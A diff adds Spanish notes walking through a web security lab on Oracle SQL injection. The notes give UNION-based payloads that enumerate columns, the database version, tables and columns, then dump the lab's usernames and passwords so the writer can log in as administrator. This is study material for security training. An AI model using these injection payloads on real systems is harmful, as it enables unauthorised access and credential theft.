@@ -213,3 +213,120 @@ vgym2pam0ggg1rbf2col
 
 
 
+
+
+
+			--> Lab: SQL injection attack, listing the database contents on Oracle
+
+-> Reconocimiento & Objectivo :
+
+Vulnerabilidad "SQL injection" en el "product category offer" 
+Podemos usar Union attack, para obtener data desde las otras tablas.
+La aplicacion tiene un "login function" y una base de datos que contiene una tabla con los nombres de usuario y contrasenas. 
+
+Para RESOLVER el lab: Necesitamos saber cual es el nombre de la tabla que contiene los "usernames y passwords" y el nombre de las columnas que contiene esa data y asi poder obtener la info de todos los usuarios.
+Luego necesiamos hacer "Log in" como Administrador.  
+
+
+-> ejecutando el ataque a la maquina:
+
+1) con burp suite y fox proyx vamos a la URL: https://0a7c002e04d7841180f62607002b0060.web-security-academy.net/filter?category=Gifts
+
+2) encendemos el capturador de burp suite app y fox proxy en el navegador.  
+
+3) Click en cualquier "category" e.g. "Gifts" (damos click en forward en burpsuite hasta finalizar la carga de la pagina)
+
+4) en burp suite > proxy > http history > click en la peticion que contenga la url: https://0aa300ce0466742f819857e300fb0063.web-security-academy.net/filter?category=Gifts , click derecho y "send to repeter" 
+
+5) en el repetir en la primera linea esta: GET /filter?category=Gifts HTTP/2 cambiar la url por: GET /filter?category=' HTTP/2 ( si devuelve un error 500, es probable que la pagina sea vulnerable a SQL injection )
+
+6) Apesar de intentar ver cuantas columanas retornaba la base datos usando los comandos:
+
+'+UNION+SELECT+NULL,NULL+FROM+dual--+
+Con esto verificamos que tiene retorna 2 columnas.
+
+- Examninando el tipo de columnas: 
+
+'+UNION+SELECT+'a','a'+FROM+dual--+
+Con esto comprobamos que las 2 columnas retornadas son de tipo "string".
+
+
+7) comprobando la version de base de datos
+(sabemos que es una tipo oracle pero para estar seguros)
+
+'+UNION+SELECT+banner,NULL+FROM+v$version--+
+Con este comando podemos ver a seguridad la version de base de datos.
+
+Resultado: 
+
+CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
+
+
+8) Mostrando la lista de tablas de la base de datos: 
+
+Para ver las tablas de la base de datos en oracle debemos usar: SELECT * FROM all_tables
+por lo tanto crearemos el comando: 
+
+' UNION SELECT NULL, table_name FROM all_tables --
+'+UNION+SELECT+NULL,+table_name+FROM+all_tables+--
+
+Nos devuelve una lista larga de tablas disponibles, pero la mas probable es la esta: 
+
+"USERS_FVOPAX"
+
+
+9) Mostrando las columnas contenidas en la tabla: 
+Identificada la tabla que posiblemente tenga la info que buscamos ahora veremos los nombres de las tablas contenidas
+
+- Segun la documentacion de Oracle la forma de ver las columnas contenidas en una tabla es la siguiente: 
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+- Buscando en google" "all_tab_columns": nos muestra las tablas disponibles: 
+https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html#GUID-F218205C-7D76-4A83-8691-BFD2AD372B63
+
+"COLUMN_NAME" alli deben estar el nombre de las columnas
+
+
+- Por lo tanto usaremos el siguiente SQL injection command para ver las columnas de nuestra tabla:
+
+' UNION SELECT NULL, COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_FVOPAX'-- 
+
+url enconded: 
+'+UNION+SELECT+NULL,+COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_FVOPAX'--+
+
+- resultado: 
+PASSWORD_NAUAFZ, USERNAME_MYAZOZ
+
+Estos son los nombres de las columnas contenidas en la tabla "USERS_FVOPAX"
+
+
+10) Mostrando el contenido de las columnas "PASSWORD_NAUAFZ, USERNAME_MYAZOZ" de la tabla "USERS_FVOPAX"
+Sabiendo el nombre de las columnas que parecen ser las que contienen la data que necesitamos 
+procdemos a ver su contenido usando el comando: 
+
+' UNION SELECT PASSWORD_NAUAFZ, USERNAME_MYAZOZ FROM USERS_FVOPAX --
+
+url encoded:
+'+UNION+SELECT+PASSWORD_NAUAFZ,+USERNAME_MYAZOZ+FROM+USERS_FVOPAX+--
+
+- Resultado: 
+
+74h7ndydhimxio8esqmx
+	carlos
+mcv0r0jn75e8tqb0ywvv
+	administrator
+vuv9zwat9llc6g9ruxv2
+	wiener
+
+11) Hacemos log in como administradores usando la contrasena. 
+
+
+
+
+
+
